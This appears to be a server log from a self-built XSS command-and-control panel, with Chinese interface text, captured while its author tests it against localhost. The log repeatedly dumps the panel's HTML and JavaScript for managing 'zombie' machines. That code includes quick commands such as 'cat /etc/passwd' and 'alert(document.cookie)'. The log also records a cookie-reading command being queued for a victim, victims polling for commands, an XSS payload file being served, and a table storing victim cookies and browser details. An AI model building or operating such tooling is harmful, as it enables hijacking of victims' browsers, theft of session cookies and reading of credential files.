選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:46:49 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:49] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 21:46:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:46:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:46:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:46:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:46:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:46:55 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:46:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0007s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:24:47.378Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:24:47.380560</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 21:46:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:55] "GET /api/control/get_messages?tab=zombies HTTP/1.1" 200 -
2025-06-26 21:46:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:55] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 21:46:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:55] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 21:46:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 21:46:59 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 21:46:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 21:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:59] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 21:46:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 21:46:59 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 21:46:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 21:46:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:46:59] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 21:47:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:00 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 21:47:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_command_to_do(zombie_ip='127.0.0.1')
2025-06-26 21:47:03 | INFO     | control_route.py:200 | add_command_to_do() | 用戶請求為殭屍機器 127.0.0.1 添加命令
2025-06-26 21:47:03 | INFO     | control_route.py:218 | add_command_to_do() | 成功為殭屍機器 127.0.0.1 添加命令: alert(document.cookie)
2025-06-26 21:47:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_command_to_do 執行完畢 (耗時: 0.0042s) -> 回傳: <Response 124 bytes [200 OK]>
2025-06-26 21:47:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:03] "POST /api/control/add_command_to_do/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:04 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 21:47:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:06] "[33mPOST /api/control/send_result HTTP/1.1[0m" 404 -
2025-06-26 21:47:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 21:47:09 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-26 21:47:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 39 bytes [200 OK]>
2025-06-26 21:47:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 21:47:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:11] "[33mPOST /api/control/send_result HTTP/1.1[0m" 404 -
2025-06-26 21:47:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-26 21:47:11 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-26 21:47:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 4313 bytes [200 OK]>
2025-06-26 21:47:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:11] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-26 21:47:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 21:47:11 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-26 21:47:11 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command, target_report) VALUES (?, ?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","hostname":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-26T13:47:11.835Z"}', None, '2025-06-26 21:47:11.839079', None, None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-26 21:47:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-26 21:47:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 21:47:11] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-26 21:47:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 21:47:11 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-26 21:47:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0016s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'alert(document.cookie)\')">查看cookie</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T13:24:47.378Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 21:24:47.380560</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            